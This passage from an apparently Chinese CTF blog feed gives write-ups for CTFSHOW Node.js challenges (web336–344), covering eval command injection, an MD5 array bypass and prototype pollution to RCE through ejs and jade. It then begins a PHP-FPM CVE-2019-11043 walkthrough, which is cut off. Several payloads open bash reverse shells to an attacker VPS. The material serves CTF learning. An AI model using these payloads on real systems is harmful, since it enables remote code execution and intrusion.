<code>exe</code> + <code>cSync</code>，然后拼接字符串，%2B是加号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234111861.png"></p><p>然后读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;cat fl001g.txt&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234159579.png"></p><p><strong>2. spawnSync() 命令执行</strong></p><p>跟web335一样，换成<code>spawnSync()</code>即可绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234326867.png"></p><p><strong>3. readFileSync() 文件读取</strong></p><p>先用<code>readdirSync()</code>读取目录文件，然后用<code>readFileSync()</code>读取文件内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234703548.png"></p><h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><p>题目给出了源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>其中重点需要关注的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br></pre></td></tr></table></figure><p>要求传入的<code>a</code>和<code>b</code>长度相同，内容不相同且要求 <code>a</code> 加上 <code>flag</code> 后的 MD5 哈希值，必须等于 <code>b</code> 加上 <code>flag</code> 后的 MD5 哈希值</p><p>这里我们用<strong>数组绕过</strong></p><p>这里涉及到一个概念，如果传入<code>a[]=1&amp;b[]=2</code>，返回的是数组<code>[&#39;1&#39;]</code>和<code>[&#39;2&#39;]</code>，在md5校验那里就相当于需要<code>[&#39;1&#39;]+flag===[&#39;2&#39;]+flag</code>，而由于JavaScript **隐式类型转换 + 字符串拼接 **的原因，<code>[&#39;1&#39;]+flag</code>会变成<code>1flag</code>，举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span> + [<span class="number">2</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 步骤： [2,2] -&gt; 调用 toString() =&gt; &quot;2,2&quot;</span></span><br><span class="line"><span class="comment">// 字符串拼接 =&gt; &quot;1&quot; + &quot;2,2&quot; =&gt; &quot;12,2&quot;</span></span><br></pre></td></tr></table></figure><p>因此只要我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b=1</span><br></pre></td></tr></table></figure><p>a解析为数组<code>[&#39;1&#39;]</code>，b解析为字符串<code>&#39;1&#39;</code>，经过转换之后，得到的结果都是<code>1flag</code>，因此它们的md5相同，成功通过验证</p><p>也是顺利拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812172007286.png"></p><p>还有一种方法，就是往数组里面传入<strong>非数字索引</strong>，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure><p>返回的结果是<code>&#123; x: &#39;1&#39;&#125;</code>和<code>&#123; x: &#39;2&#39;&#125;</code>，变成JS里面的对象了，传入对象之后，经过<code>console.log</code>后返回的都是<code>[object Object]</code>，此时进行变量拼接得到的结果为<code>[object Object]flag</code>，再进行md5加密之后也是相同的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812174110379.png"></p><p>如果传入<code>a[x]=1&amp;b[x]=1</code>也是可以的，因为两个对象的比较并不是比较属性，而是通过引用内存里的位置来比较的，所以 <code>a !== b</code> 的条件依然成立</p><h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>下载源码分析，先看<code>app.js</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250812185834888.png"></p><p>可以看到包含了<code>index.js</code>和<code>login.js</code>，<code>index.js</code>里面没什么东西，主要看<code>login.js</code>文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812194405714.png"></p><p>想要拿到flag就必须要<strong>secert</strong>的<code>ctfshow</code>属性值为<code>36dboy</code>，且secert变量值为空。向下分析，可以看到body的内容被copy到了user里面，查看copy的定义，可以发现copy竟然跟merge方法一模一样，因此这题可以用<strong>原型链污染</strong>来做，传入属性<code>__proto__</code>来污染Object原型</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813180749964.png"></p><p>做原型链污染之前，建议先看一遍文章了解一下：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">深入理解 JavaScript Prototype 污染攻击</a></p><p>打开题目环境，随便输入账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812192813708.png"></p><p>可以看到body的值传到了user里面，我们修改键值对为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样做可以污染Object的原型，从而使得所有对象都继承了该属性，于是进行验证的时候，满足<code>secert.ctfshow===&#39;36dboy&#39;</code>，也就拿到了flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812192921525.png"></p><p>原型链被污染后，部分代码里其他依赖对象原型正常结构的地方会出错，依赖于纯净、标准原型链的对象操作（比如 for…in、Object.keys()、属性枚举和判断、库函数内部操作等）可能会出错或出现行为异常，导致POST访问<code>/login</code>时报 500 错误</p><p>因此这题只有一次污染机会，如果写错了值的话就只能重新启动环境做了，因为POST访问<code>/login</code>只返回500了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812193909573.png"></p><h3 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h3><p>打开源码分析，在<code>app.js</code>可以看到指向三个路由</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813110919891.png"></p><p>相比上一题，这题<code>login.js</code>的校验条件变了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813111110126.png"></p><p>要求<code>secert.ctfshow===flag</code>，但我们并不知道flag的值，因此只能另辟蹊径</p><p>继续分析<code>api.js</code>，发现可以通过<strong>污染query</strong>来控制Function执行RCE操作</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813111300263.png"></p><p>由于 Node.js 默认不会自动暴露 <code>require</code> 给 <code>Function</code> 创建的函数，因此这里用<code>process.mainModule.constructor._load</code> 替代 <code>require</code>来包含<code>child_process</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里我们用exec执行反弹shell，因为exec是异步的，适用于长时间&#x2F;交互式&#x2F;不需要立即结果的任务（例如反弹 shell、启动后台进程、并发执行多任务）。这题的目标不是“读取输出”，而是“建立外部控制会话”，因此异步 exec 足以完成“执行命令”的动作，而且更贴合反连的使用场景：父进程不被阻塞，持续提供服务</p><p>先在VPS处开启<code>nc</code>监听，然后跟上题一样，在<code>/login</code>处传入payload</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114617857.png"></p><p>接着POST访问<code>/api</code>即可建立连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114957019.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114917719.png"></p><p>执行命令<code>env</code>，在环境变量里成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813115850012.png"></p><h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>下载源码进行分析，也是先看<code>app.js</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813201348782.png"></p><p>可以看到，还是这几个文件，不过不同的是，<code>login.js</code>里面的user变量变了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813201624962.png"></p><p>要求<code>isAdmin</code>为true才可以通过，但是<code>isAdmin</code>已经被赋值为false了，因此在这里没办法污染</p><p>继续分析，可以看到<code>api.js</code>跟上题一样，因此可以用上题的方法来污染query反弹shell</p><p>但是如果直接传入<code>__proto__</code>，再访问<code>/api</code>会发现行不通</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813202719540.png"></p><p>需要污染两层才可以，因为<code>user.__proto__</code>不是<code>Object.prototype</code>，<code>user.__proto.__proto__</code>才是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250813203743959.png"></p><p>也是在环境变量处找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813203902301.png"></p><p>下面详细解释一下为什么<code>user.__proto__</code>不是指向<code>Object.prototype</code>，开启本地调试，先在web340项目文件夹处打开终端，运行 <code>npm install</code>安装依赖</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204211882.png"></p><p>然后在项目文件夹处打开package.json，可以看到<strong>负责启动服务器</strong>的是<code>bin/www</code>，因为在很多标准的Express项目中，项目结构是分离的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204457722.png"></p><p>修改配置文件的工作目录为web340，文件为<code>bin/www</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204802599.png"></p><p>在<code>www</code>文件中，可以看到运行的端口是在3000</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204914963.png"></p><p>在<code>login.js</code>的第19行开启断点调试，然后在浏览器中打开 <a href="http://127.0.0.1:3000/">http://127.0.0.1:3000</a> ，在登录框随便输入点东西，触发<code>if(user.userinfo.isAdmin)&#123;</code>判断</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813205642028.png"></p><p>可以看到userinfo的<code>__proto__</code>后<code>__proto__</code>才是Object的<code>prototype</code>，为了更直观，我们在控制台输出看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813210054705.png"></p><p>对于user这个变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是外层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是内层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>user.userinfo</code> 对象是由内层构造函数创建的，所以 <code>user.userinfo.__proto__</code> 指向内层构造函数的<code>prototype</code></p><p>而内层构造函数的<code>__proto__</code>指向的才是Object的<code>prototype</code></p><p>所以这就是为什么要传入两次的原因</p><p><strong>拓展概念</strong></p><p>只有函数才拥有 <code>prototype</code> 属性，而由构造函数创建出来的普通对象实例没有这个属性</p><p>例如<code>user.userinfo</code>是一个<strong>对象实例</strong>，但它没有属于自己的 <code>prototype</code> 属性，控制台输出为<code>undefined</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813211513738.png"></p><table><thead><tr><th>属性</th><th>谁拥有</th><th>作用</th></tr></thead><tbody><tr><td><code>prototype</code></td><td>构造函数</td><td>定义实例继承的“蓝图”</td></tr><tr><td><code>__proto__</code></td><td>任意对象实例（包括函数对象）</td><td>一个指向其构造器的 <code>prototype</code> 的引用指针</td></tr></tbody></table><h3 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h3><p>下载附件分析代码，发现这题没有<code>api.js</code>了，而且<code>login.js</code>也没有地方污染</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813223720736.png"></p><p>继续分析代码，在<code>app.js</code>可以看到包含了ejs，且引擎设置为ejs</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813224859620.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813232421761.png"></p><p>网上搜了一下，发现<strong>ejs模板引擎</strong>有个漏洞可以利用，实现<strong>从原型链污染到RCE</strong></p><p>参考文章：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>跟上题一样，也是在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813225514864.png"></p><p>在<code>env</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813225743400.png"></p><h3 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h3><p>下载代码分析，总体跟上题代码差不多，但是<code>app.js</code>这两个地方不同</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813232321669.png"></p><p>模板引擎换成了<strong>jade</strong>，上网参考了部分文章，链接：<a href="https://xz.aliyun.com/news/6621">再探 JavaScript 原型链污染到 RCE</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>跟上题一样，在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813234149899.png"></p><p>在<code>env</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813234333039.png"></p><h3 id="web343"><a href="#web343" class="headerlink" title="web343"></a>web343</h3><p>这题在web342的基础上增加了过滤，但是影响不大，可以继续用上题的方法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235152689.png"></p><p>在环境变量中读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235308095.png"></p><p>后面看了一下<code>login.js</code>到底过滤了什么</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235855849.png"></p><p>只过滤了<code>text</code>，没什么用</p><h3 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h3><p>这题给出了部分代码，先分析一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>过滤了<strong>8c、2c和逗号</strong>，然后要求<strong>GET</strong>传入参数<strong>query</strong>，且满足 <code>query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true</code> 才可以拿到flag</p><p>也就是正常情况下我们应该传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>而经过URL编码之后变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D</span><br></pre></td></tr></table></figure><p>双引号编码之后是<code>%22</code>，和c连接起来就是<code>%22c</code>，会被ban</p><p>这题用到了<strong>NodeJS的特性</strong>，当 URL 里传入了多个同名参数，如多次出现 <code>query=</code>，Express 解析会将这些参数放入数组中，然后<code>JSON.parse</code> 会将数组的字符串元素拼接成一个完整字符串再解析。同时<code>c</code>也要进行URL编码，变成<code>%63</code>，这样就不会被ban了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250814002612463.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>bfengj：<a href="https://blog.csdn.net/rfrder/article/details/115218397">CTFshow-WEB入门-node.js</a></p><p>yu22x：<a href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW nodejs专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | phpCVE题解 web311 - web315</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/</id>
    <published>2025-08-10T14:13:29.000Z</published>
    <updated>2025-08-10T14:17:02.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h3><p>打开题目环境，先看看题目使用了什么语言和服务，F12打开<strong>网络</strong>，或者用<strong>Wappalyer</strong>查看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810130549601.png"></p><p>可以看到目标环境为 Nginx + PHP-FPM，且PHP版本为7.1</p><p>上网搜索对应的漏洞，发现<strong>CVE-2019-11043</strong>符合我们的要求</p><p>具体可以参考链接：<a href="https://cloud.tencent.com/developer/article/1530703">https://cloud.tencent.com/developer/article/1530703</a></p><p><strong>漏洞描述</strong></p><p><strong>CVE-2019-11043</strong> 是一个重要的 PHP-FPM 远程代码执行漏洞，主要影响配置不当的 Nginx + PHP-FPM 网站，攻击者可利用该漏洞执行任意 PHP 代码，进而控制目标服务器</p><p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常</p><p>该漏洞需要在nginx.conf中进行特定配置才能触发，具体配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:9000;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当用户在请求路径中插入编码为 <code>%0a</code> 的换行符，Nginx 的正则处理会使 <code>PATH_INFO</code> 为空。传递给 PHP-FPM 后，由于变量长度与内容可被精确控制，进而影响内存布局，使攻击者可构造特殊的 FastCGI 参数（如可控伪造 <code>PHP_VALUE</code>）</p><p><strong>影响范围</strong></p><p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p><ul><li>PHP 7.0 </li><li>PHP 7.1 </li><li>PHP 7.2 </li><li>PHP 7.3</li></ul><p>这题要用到的工具是<code>phuip-fpizdam</code>，项目地址：<a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p><p>该工具是基于Go语言构建的，需要先搭建好环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#更新本地软件包</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">#安装Go</span><br><span class="line">apt install golang</span><br><span class="line"></span><br><span class="line">#验证</span><br><span class="line">go -version</span><br></pre></td></tr></table></figure><p>然后github下载工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#克隆项目到本地</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"></span><br><span class="line">#进入工具目录</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line"></span><br><span class="line">#获取依赖包和编译代码</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810142707385.png"></p><p>然后使用工具执行命令，地址换成自己的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . <span class="string">&quot;http://d654f5bf-2024-4d68-a045-c216dba47a44.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810143609055.png"></p><p>最后返回题目，在<code>/index.php?a=</code>执行命令即可，如果没反应就多执行几次</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810143839197.png"></p><p>flag在<code>fl0gHe1e.txt</code>里面，执行<code>/index.php?a=cat 